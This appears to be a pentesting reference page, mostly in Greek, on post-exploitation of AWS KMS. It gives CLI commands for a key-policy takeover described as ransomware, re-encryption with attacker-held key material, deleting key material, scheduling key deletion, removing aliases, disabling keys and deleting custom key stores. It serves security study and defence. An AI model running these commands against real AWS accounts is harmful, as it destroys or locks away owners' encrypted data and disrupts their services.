# AWS - KMS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## KMS

Για περισσότερες πληροφορίες δείτε:

{{#ref}}
../../aws-services/aws-kms-enum.md
{{#endref}}

### Encrypt/Decrypt πληροφορίες

`fileb://` και `file://` είναι σχήματα URI που χρησιμοποιούνται στις εντολές AWS CLI για να καθορίσουν τη διαδρομή προς τοπικά αρχεία:

- `fileb://:` Διαβάζει το αρχείο σε δυαδική λειτουργία, συνήθως χρησιμοποιείται για μη-κείμενα αρχεία.
- `file://:` Διαβάζει το αρχείο σε κειμενική λειτουργία, τυπικά χρησιμοποιείται για αρχεία απλού κειμένου, scripts, ή JSON που δεν έχει ειδικές απαιτήσεις κωδικοποίησης.

> [!TIP]
> Σημειώστε ότι αν θέλετε να decrypt κάποια δεδομένα μέσα σε ένα αρχείο, το αρχείο πρέπει να περιέχει τα δυαδικά δεδομένα, όχι base64 κωδικοποιημένα δεδομένα. (fileb://)

- Χρησιμοποιώντας ένα **symmetric** key
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
- Χρήση ενός **ασύμμετρου** κλειδιού:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS Ransomware

Ένας επιτιθέμενος με προνομιακή πρόσβαση στο KMS μπορεί να τροποποιήσει την KMS policy των keys και **να χορηγήσει στον λογαριασμό του πρόσβαση σε αυτά**, αφαιρώντας την πρόσβαση που είχε δοθεί στον legit account.

Τότε, οι χρήστες του legit account δεν θα μπορούν να έχουν πρόσβαση σε καμία πληροφορία από οποιαδήποτε υπηρεσία έχει κρυπτογραφηθεί με αυτά τα keys, δημιουργώντας ένα απλό αλλά αποτελεσματικό ransomware στον λογαριασμό.

> [!WARNING]
> Σημειώστε ότι **AWS managed keys δεν επηρεάζονται** από αυτήν την επίθεση, μόνο **Customer managed keys**.

> Επίσης σημειώστε την ανάγκη χρήσης της παραμέτρου **`--bypass-policy-lockout-safety-check`** (η έλλειψη αυτής της επιλογής στην web κονσόλα καθιστά αυτή την επίθεση δυνατή μόνο από το CLI).
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
> [!CAUTION]
> Σημειώστε ότι αν αλλάξετε αυτήν την πολιτική και δώσετε πρόσβαση μόνο σε ένα external account, και στη συνέχεια από αυτό το external account προσπαθήσετε να ορίσετε μια νέα πολιτική για να **give the access back to original account, you won't be able cause the Put Polocy action cannot be performed from a cross account**.

<figure><img src="../../../images/image (77).png" alt=""><figcaption></figcaption></figure>

### Γενικό KMS Ransomware

Υπάρχει ένας άλλος τρόπος για να εκτελέσετε ένα παγκόσμιο KMS Ransomware, ο οποίος θα περιλάμβανε τα ακόλουθα βήματα:

- Δημιουργήστε ένα νέο **key with a key material** εισαγόμενο από τον attacker
- **Re-encrypt older data** του victim που είχε κρυπτογραφηθεί με την προηγούμενη έκδοση, με τη νέα
- **Delete the KMS key**
- Τώρα μόνο ο attacker, που έχει το original key material, θα μπορούσε να αποκρυπτογραφήσει τα κρυπτογραφημένα δεδομένα

### Διαγραφή κλειδιών μέσω kms:DeleteImportedKeyMaterial

Με την άδεια `kms:DeleteImportedKeyMaterial`, ένας actor μπορεί να διαγράψει το imported key material από CMKs με `Origin=EXTERNAL` (CMKs που έχουν εισαγάγει το key material τους), καθιστώντας τα ανίκανα να αποκρυπτογραφήσουν δεδομένα. Αυτή η ενέργεια είναι καταστροφική και μη αναστρέψιμη εκτός αν επανεισαχθεί συμβατό key material, επιτρέποντας σε έναν attacker να προκαλέσει ουσιαστικά απώλεια δεδομένων τύπου ransomware κάνοντας τις κρυπτογραφημένες πληροφορίες μόνιμα μη προσβάσιμες.
```bash
aws kms delete-imported-key-material --key-id <Key_ID>
```
### Καταστροφή κλειδιών

Καταστρέφοντας κλειδιά, είναι δυνατό να προκληθεί DoS.
```bash
# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
> [!CAUTION]
> Σημειώστε ότι η AWS πλέον **αποτρέπει την εκτέλεση των προηγούμενων ενεργειών από cross account:**
>
> ### Change or delete Alias
> Αυτή η επίθεση διαγράφει ή ανακατευθύνει τα AWS KMS aliases, διακόπτοντας την επίλυση του κλειδιού και προκαλώντας άμεσες αποτυχίες σε οποιεσδήποτε υπηρεσίες που βασίζονται σε αυτά τα aliases, οδηγώντας σε denial-of-service. Με δικαιώματα όπως `kms:DeleteAlias` ή `kms:UpdateAlias` ένας attacker μπορεί να αφαιρέσει ή να επαναστοχεύσει τα aliases και να διαταράξει κρυπτογραφικές λειτουργίες (π.χ., encrypt, describe). Οποιαδήποτε υπηρεσία που αναφέρεται στο alias αντί για το key ID μπορεί να αποτύχει μέχρι να αποκατασταθεί το alias ή να γίνει σωστή επαναχαρτογράφηση.
```bash
# Delete Alias
aws kms delete-alias --alias-name alias/<key_alias>

# Update Alias
aws kms update-alias \
--alias-name alias/<key_alias> \
--target-key-id <new_target_key>
```
### Ακύρωση Διαγραφής Κλειδιού
Με δικαιώματα όπως `kms:CancelKeyDeletion` και `kms:EnableKey`, ένα άτομο μπορεί να ακυρώσει μια προγραμματισμένη διαγραφή ενός AWS KMS customer master key και αργότερα να το ενεργοποιήσει ξανά. Με αυτόν τον τρόπο ανακτάται το κλειδί (αρχικά στην κατάσταση Disabled) και αποκαθίσταται η ικανότητά του να αποκρυπτογραφεί δεδομένα που προηγουμένως ήταν προστατευμένα, επιτρέποντας exfiltration.
```bash
# Firts cancel de deletion
aws kms cancel-key-deletion \
--key-id <Key_ID>

## Second enable the key
aws kms enable-key \
--key-id <Key_ID>
```
### Disable Key
Με την άδεια `kms:DisableKey`, ένας χρήστης μπορεί να απενεργοποιήσει ένα AWS KMS customer master key, εμποδίζοντάς το να χρησιμοποιηθεί για κρυπτογράφηση ή αποκρυπτογράφηση. Αυτό διακόπτει την πρόσβαση για οποιεσδήποτε υπηρεσίες που εξαρτώνται από αυτό το CMK και μπορεί να προκαλέσει άμεσες διαταραχές ή άρνηση υπηρεσίας έως ότου το κλειδί ενεργοποιηθεί ξανά.
```bash
aws kms disable-key \
--key-id <key_id>
```
### Παράγω Κοινό Μυστικό
Με την άδεια `kms:DeriveSharedSecret`, ένας ενεργός χρήστης μπορεί να χρησιμοποιήσει ένα ιδιωτικό κλειδί που διατηρείται στο KMS μαζί με ένα δημόσιο κλειδί παρεχόμενο από τον χρήστη για να υπολογίσει ένα κοινό μυστικό ECDH.
```bash
aws kms derive-shared-secret \
--key-id <key_id> \
--public-key fileb:///<route_to_public_key> \
--key-agreement-algorithm <algorithm>
```
### Impersonation μέσω kms:Sign
Με την άδεια `kms:Sign`, ένας actor μπορεί να χρησιμοποιήσει ένα CMK που είναι αποθηκευμένο στο KMS για να υπογράψει κρυπτογραφικά δεδομένα χωρίς να εκθέσει το private key, παράγοντας έγκυρες υπογραφές που μπορούν να επιτρέψουν impersonation ή να εξουσιοδοτήσουν κακόβουλες ενέργειες.
```bash
aws kms sign \
--key-id <key-id> \
--message fileb://<ruta-al-archivo> \
--signing-algorithm <algoritmo> \
--message-type RAW
```
### DoS with Custom Key Stores
Με δικαιώματα όπως `kms:DeleteCustomKeyStore`, `kms:DisconnectCustomKeyStore` ή `kms:UpdateCustomKeyStore`, ένας παράγοντας μπορεί να τροποποιήσει, αποσυνδέσει ή διαγράψει ένα AWS KMS Custom Key Store (CKS), καθιστώντας τα κύρια κλειδιά του μη λειτουργικά. Αυτό διακόπτει τις λειτουργίες κρυπτογράφησης, αποκρυπτογράφησης και υπογραφής για οποιεσδήποτε υπηρεσίες που εξαρτώνται από αυτά τα κλειδιά και μπορεί να προκαλέσει άμεσο denial-of-service. Γι' αυτό είναι κρίσιμο να περιορίζονται και να παρακολουθούνται αυτά τα δικαιώματα.
```bash
aws kms delete-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms disconnect-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms update-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID> --new-custom-key-store-name <NEW_NAME> --key-store-password <NEW_PASSWORD>
```
<figure><img src="../../../images/image (76).png" alt=""><figcaption></figcaption></figure>

{{#include ../../../../banners/hacktricks-training.md}}
